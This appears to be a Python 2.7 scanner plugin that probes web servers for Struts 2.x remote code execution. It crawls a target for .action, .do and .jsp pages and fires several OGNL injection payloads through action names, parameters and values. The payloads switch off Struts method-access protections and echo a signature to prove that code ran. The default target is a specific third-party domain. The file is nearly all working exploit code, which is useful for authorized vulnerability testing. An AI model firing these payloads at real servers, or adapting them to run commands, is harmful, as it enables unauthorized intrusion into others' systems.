#!/usr/bin/python2.7
#coding:utf-8

import os
import re, sys, copy, urlparse, urllib, urllib2, optparse, posixpath
from dummy import * 

info = {
	'NAME':'Struts 2.x Remote Command Execution',
	'AUTHOR':'isqlmap,yangbh',
	'TIME':'20141119',
	'WEB':'http://beebeeto.com/pdb/poc-2014-0013/',
	'DESCRIPTION':'struts2 代码执行'
}

SIGNATURE = "7JMJJMJJ-X3Y3-9527-86F5-CGHMJSTVSMJJ"
COOKIE, UA, REFERER = "Cookie", "User-Agent", "Referer"
GET, POST = "GET", "POST" 
	
sharpPoc1  = r"struts"
sharpPoc1 += r"&(a)(('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(z))"
sharpPoc1 += r"&(b)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(z))"
sharpPoc1 += r"&(c)(('\u0023_memberAccess.excludeProperties\u003d{}')(z))"
sharpPoc1 += r"&(d)(('\u0023a_str\u003d\'7JMJJMJJ-X3Y3-9527-\'')(z))"
sharpPoc1 += r"&(e)(('\u0023b_str\u003d\'86F5-CGHMJSTVSMJJ\'')(z))"
sharpPoc1 += r"&(n)(('\u0023a_resp\u003d@org.apache.struts2.ServletActionContext@getResponse()')(z))"
sharpPoc1 += r"&(o)(('\u0023a_resp.getWriter().println(\u0023a_str\u002B\u0023b_str)')(z))"
sharpPoc1 += r"&(p)(('\u0023a_resp.getWriter().flush()')(z))"
sharpPoc1 += r"&(q)(('\u0023a_resp.getWriter().close()')(z))"

sharpPoc2  = r"struts"
sharpPoc2 += r"&(a)(('\43_memberAccess.allowStaticMethodAccess\75true')(z))"
sharpPoc2 += r"&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(z))"
sharpPoc2 += r"&(c)(('\43_memberAccess.excludeProperties\75{}')(z))"
sharpPoc2 += r"&(d)(('\43a_str\75\'7JMJJMJJ-X3Y3-9527-\'')(z))"
sharpPoc2 += r"&(e)(('\43b_str\75\'86F5-CGHMJSTVSMJJ\'')(z))"
sharpPoc2 += r"&(n)(('\43a_resp\75@org.apache.struts2.ServletActionContext@getResponse()')(z))"
sharpPoc2 += r"&(o)(('\43a_resp.getWriter().println(\43a_str\53\43b_str)')(z))"
sharpPoc2 += r"&(p)(('\43a_resp.getWriter().flush()')(z))"
sharpPoc2 += r"&(q)(('\43a_resp.getWriter().close()')(z))"

sharpPoc3  = r"debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,%23a=%277JMJJMJJ-X3Y3-9527-%27,%23b=%2786F5-CGHMJSTVSMJJ%27,%23resp=@org.apache.struts2.ServletActionContext@getResponse%28%29,%23resp.getWriter%28%29.println%28%23a.concat%28%23b%29%29,%23resp.getWriter%28%29.flush%28%29,%23resp.getWriter%28%29.close%28%29"

jarPathPoc =  r"class.classLoader.jarPath=("
jarPathPoc += r"#context[\"xwork.MethodAccessor.denyMethodExecution\"]=new java.lang.Boolean(false),"
jarPathPoc += r"#_memberAccess[\"allowStaticMethodAccess\"]=new java.lang.Boolean(true),"
jarPathPoc += r"#_memberAccess.excludeProperties={},"
jarPathPoc += r"#a_str='7JMJJMJJ-X3Y3-9527-',"
jarPathPoc += r"#b_str='86F5-CGHMJSTVSMJJ',"
jarPathPoc += r"#a_resp=@org.apache.struts2.ServletActionContext@getResponse(),"
jarPathPoc += r"#a_resp.getWriter().println(#a_str+#b_str),"
jarPathPoc += r"#a_resp.getWriter().flush(),"
jarPathPoc += r"#a_resp.getWriter().close()"
jarPathPoc += r")(x3y3)&x[(class.classLoader.jarPath)('3y3x')]=true"

pocs = [sharpPoc1,sharpPoc2,sharpPoc3,jarPathPoc]

payload1  = r"#context[\"xwork.MethodAccessor.denyMethodExecution\"]=new java.lang.Boolean(false),"
payload1 += r"#_memberAccess[\"allowStaticMethodAccess\"]=new java.lang.Boolean(true),"
payload1 += r"#_memberAccess.excludeProperties={},"
payload1 += r"#a_str='7JMJJMJJ-X3Y3-9527-',"
payload1 += r"#b_str='86F5-CGHMJSTVSMJJ',"
payload1 += r"#a_resp=@org.apache.struts2.ServletActionContext@getResponse(),"
payload1 += r"#a_resp.getWriter().println(#a_str+#b_str),"
payload1 += r"#a_resp.getWriter().flush(),"
payload1 += r"#a_resp.getWriter().close()"

payload2  = r"#context['xwork.MethodAccessor.denyMethodExecution']=false,"
payload2 += r"#_memberAccess.allowStaticMethodAccess=true,"
payload2 += r"#_memberAccess.excludeProperties={},"
payload2 += r"#a_str='7JMJJMJJ-X3Y3-9527-',"
payload2 += r"#b_str='86F5-CGHMJSTVSMJJ',"
payload2 += r"#a_resp=@org.apache.struts2.ServletActionContext@getResponse(),"
payload2 += r"#a_resp.getWriter().println(#a_str+#b_str),"
payload2 += r"#a_resp.getWriter().flush(),"
payload2 += r"#a_resp.getWriter().close()"

payload3 = r"${"
payload3 += r"#a_str=new java.lang.String('7JMJJMJJ-X3Y3-9527-'),"
payload3 += r"#b_str=new java.lang.String('86F5-CGHMJSTVSMJJ'),"
payload3 += r"#a_resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),"
payload3 += r"#a_resp.getWriter().println(#a_str.concat(#b_str)),"
payload3 += r"#a_resp.getWriter().flush(),"
payload3 += r"#a_resp.getWriter().close()"
payload3 += r"}"

# prefix suffix values used for building testing payloads
prefixSuffixList1 = (
	(r"'+(", r")+'"), (r"(", r")(x3y3)&z[([FOO])('3y3x')]=true"),
)
# prefix suffix values used for building testing payloads
prefixSuffixList2 = (
	(r"%{", r"}"), (r"${", r"}"),
)

prefixSuffixList3 = (
	(r"action:",r""),(r"redirect:",r""),("redirectAction:",r""),
)

prefixSuffixList = [prefixSuffixList1,prefixSuffixList2,prefixSuffixList3]
# used for storing dictionary with optional header values
_headers = {} 
# regexp(s) used for filter target urls
# .jsp extention is used for struts2 Vulnerability S13(http://struts.apache.org/development/2.x/docs/s2-013.html)
regexps = (
	r'''href\s*?=\s*?(?:"|')\s*?(.*?\.action(?:.*?))['"]>''',
	r'''action\s*?=\s*?(?:"|')\s*?(.*?\.action(?:.*?))['"]>''',
	r'''src\s*?=\s*?(?:"|')\s*?(.*?\.action(?:.*?))['"]>''',
	r'''href\s*?=\s*?(?:"|')\s*?(.*?\.do(?:.*?))['"]''',
	r'''action\s*?=\s*?(?:"|')\s*?(.*?\.do(?:.*?))['"]''',
	r'''src\s*?=\s*?(?:"|')\s*?(.*?\.do(?:.*?))['"]''',
	r'''href\s*?=\s*?(?:"|')\s*?(.*?\.jsp(?:.*?))['"]''',
	r'''action\s*?=\s*?(?:"|')\s*?(.*?\.jsp(?:.*?))['"]''',
	r'''src\s*?=\s*?(?:"|')\s*?(.*?\.jsp(?:.*?))['"]''',    
)

def getCrawlerHrefs(url):
	''' '''
	try:
		cf = CrawlerFile(url=url)
		urls = cf.getSection('Hrefs')
		return urls
	except Exception,e:
		print 'Exception:\t',e
		return [url]

def getCrawlerFileExts(url):
	''' '''
	try:
		cf = CrawlerFile(url=url)
		exts = cf.getSection('FileExtensions')
		return exts
	except Exception,e:
		print 'Exception:\t',e
		return []

def getOneUrlByExts(url,ext='.do,.action,.jsp,.jspx'):
	urls = getCrawlerHrefs(url)
	exts = ext.split(',')
	ret = []
	alexts = []
	for url in urls:
		for ext in exts:
			if url.lower().endswith(ext) and ext not in alexts:
				alexts.append(ext)
				ret.append(url)
				break
	return ret

def getFileName(path):
	retVal = None
	if not path:
		return retVal
	for i in ['.action','.do','.jsp']:
		if path.endswith(i):
			retVal = path.split('.')[0]
			return retVal
		
	return retVal

def urlencode(value, safe="&="):
	retVal = urllib.quote(value, safe)
	return retVal

def queryPage(url, method='GET', data=None, headers=_headers, onlyPage=False):
	"""
	do request and find out whether SIGNATURE is in html page
	"""

	retVal = False

	if isinstance(data, dict):
		data = urllib.urlencode(data)
	elif isinstance(data, basestring):
		data = urlencode(data)
	else:
		data = data

	req = urllib2.Request(url, data, headers)
	try:
		response = urllib2.urlopen(req)
		page = response.read()
	except urllib2.HTTPError, error:
		page = error.read()
	except:
		page = ''
		
	if onlyPage:
		return page
	
	if SIGNATURE in page:
		retVal = True

	return retVal

def fuzzAction(url):
	"""
	fuzz action test
	"""
	fileName = None
	o = urlparse.urlparse(url)
	reqUrl = "%s://%s:%s%s" %(o.scheme, o.hostname, o.port, o.path) if o.port not in [80, None] \
		else "%s://%s%s" %(o.scheme,o.hostname, o.path)
	if o.path:
		path = o.path.split('/')
		path = path[-1:][0] if path else None
		fileName = getFileName(path)
		
	for poc in pocs:
		getUrl = "%s?%s" %(reqUrl, poc)

		if queryPage(getUrl,GET):
			security_hole(url)
			return True, getUrl, GET

		elif queryPage(reqUrl, POST, poc):
			security_hole(url)
			return True, getUrl, POST
		else:
			pass
	
	if fileName:
		print 'fileName=',fileName
		print 'prefixSuffixList=',prefixSuffixList
		for prefix, suffix in prefixSuffixList:
			payload = r"%s%s%s" %(prefix, payload3, suffix)
			payload = urlencode(payload)
			getUrl = "%s?%s" %(reqUrl, o.query) if o.query else reqUrl
			getUrl = getUrl.replace(fileName, payload)
			if queryPage(getUrl,GET):
				security_hole(url)
				return True, getUrl, GET

	return False, url, GET

def fuzzParam(url):
	"""
	fuzz param test
	"""
	o = urlparse.urlparse(url)
	queryDict = toParamDict(o.query)
	tempDict =  copy.deepcopy(queryDict)		
	reqUrl = "%s://%s:%s%s" %(o.scheme, o.hostname, o.port, o.path) if o.port not in [80,None] \
		else "%s://%s%s" %(o.scheme,o.hostname, o.path)

	for param in queryDict:

		for prefix, suffix in prefixSuffixList1:				
			payload = r"%s%s%s" %(prefix, payload1, suffix)				
			tempDict[param] = payload

			queryStr = toParamStr(tempDict)
			queryStr = urlencode(queryStr)
			getUrl = "%s?%s" %(reqUrl, queryStr)
			if queryPage(getUrl,GET):
				security_hole(url)
				return True, getUrl, GET
			if queryPage(reqUrl, POST, tempDict):
				security_hole(url)
				return True, getUrl, POST

		for prefix,suffix in prefixSuffixList2:				
			payload = r"%s%s%s" %(prefix, payload2, suffix)				
			tempDict[param] = payload

			queryStr = toParamStr(tempDict)
			queryStr = urlencode(queryStr)
			getUrl = "%s?%s" %(reqUrl, queryStr)
			if queryPage(getUrl, GET):
				security_hole(url)
				return True, getUrl , GET
			if queryPage(reqUrl,POST, tempDict):
				security_hole(url)
				return True, getUrl, POST

	return False, reqUrl, 'GET'

def fuzzParamValue(url):
	o = urlparse.urlparse(url)
	queryDict = toParamDict(o.query)
	tempDict =  copy.deepcopy(queryDict)
	reqUrl = "%s://%s:%s%s" %(o.scheme, o.hostname, o.port, o.path) if o.port not in [80,None] \
		else "%s://%s%s" %(o.scheme,o.hostname, o.path)

	for param in queryDict:

		for prefix, suffix in prefixSuffixList1:

			for i in [payload1,payload2]:
				if '[FOO]' not in suffix:
					payload = r"%s%s%s" %(prefix, i, suffix)
					payload = urlencode(payload)
				else:	
					enPayload = urlencode(i)
					suffix = suffix.replace('[FOO]',param)
					payload = r"%s%s%s" %(prefix, enPayload, suffix)

				tempDict[param] = payload				
				queryStr = toParamStr(tempDict)

				getUrl = "%s?%s" %(reqUrl, queryStr)
				if queryPage(getUrl,GET):
					security_hole(url)
					return True, getUrl , GET
				if queryPage(reqUrl, POST, tempDict):
					security_hole(url)
					return True, getUrl, POST

	return False,reqUrl,'GET'

def Audit(services):
	if services.has_key('url'):
		url = services['url']
		exts = getCrawlerFileExts(url)
		if '.do' in exts or '.action' in exts or '.jsp' in exts or '.jspx' in exts:
			urls = getOneUrlByExts(url)
			print urls
			for url in urls:
				print '[*] Checking url: "%s"' %url
				# fuzz action
				result,payload,method = fuzzAction(url)
				if result:
					print '[+] Fuzz action find struts Vulnerability with method %s' %method
					# return result,payload,method
					return

				#to fuzz <s:a> and <s:url> tag, add a param key	
				if '?' not in url:
					url += '?k=v'

				#fuzz parameter
				result,payload,method = fuzzParam(url)
				if result:
					print '[+] Fuzz param find struts Vulnerability with method %s' %method
					# return result,payload,method
					return
				#fuzz value poc
				result,payload,method = fuzzParamValue(url)
				if result:
					print '[+] Fuzz param value find struts Vulnerability with method %s' %method
					# return result,payload,method
					return
# ----------------------------------------------------------------------------------------------------
#
# ----------------------------------------------------------------------------------------------------
if __name__ == '__main__':
	url='http://www.kangbtall.com'
	if len(sys.argv) ==  2:
		url = sys.argv[1]
	services = {'url':url}
	pprint(Audit(services))
	pprint(services)